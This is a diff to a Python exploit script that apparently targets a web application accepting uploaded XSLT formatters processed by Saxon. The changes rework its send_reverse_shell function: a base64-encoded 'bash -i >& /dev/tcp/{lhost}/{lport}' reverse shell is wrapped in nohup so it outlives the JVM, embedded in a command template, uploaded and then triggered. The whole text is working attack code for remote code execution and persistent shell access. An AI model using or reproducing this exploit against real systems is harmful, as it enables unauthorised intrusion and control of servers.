@@ -43,7 +43,6 @@ import random
 import string
 import re
 from urllib.parse import urljoin
-import threading
 
 
 XSLT_CMD_TEMPLATE = """\
@@ -216,22 +215,21 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
     """
     Encode reverse shell payload as base64 to avoid XML special character issues
     with redirect operators (>& becomes &amp;& in XML).
+    nohup detaches from Saxon's JVM process tree so the shell survives.
     """
-    inner = f"(bash -i >& /dev/tcp/{lhost}/{lport} 0>&1) &"
+    inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     b64 = base64.b64encode(inner.encode()).decode()
-    payload = f"printf {b64}|base64 -d|bash"
+    cmd = f"nohup bash -c 'printf {b64}|base64 -d|bash' > /dev/null 2>&1 &"
 
     name = rand_name("rs")
-    xsl = XSLT_SHELL_TEMPLATE.replace("{PAYLOAD}", payload)
+    xsl = XSLT_CMD_TEMPLATE.replace("{CMD}", cmd)
     code, resp = upload_formatter(session, base_url, token, name, xsl)
     if code not in (200, 201):
         print(f"[-] Upload failed ({code}): {resp}")
         return
     print(f"[*] Formatter uploaded: {name}")
     print(f"[*] Triggering... listener should be ready on port {lport}")
-    t = threading.Thread(target=trigger_formatter, args=(session, base_url, uuid, name), daemon=True)
-    t.start()
-    import time; time.sleep(15)
+    trigger_formatter(session, base_url, uuid, name)
 
 
 def banner():
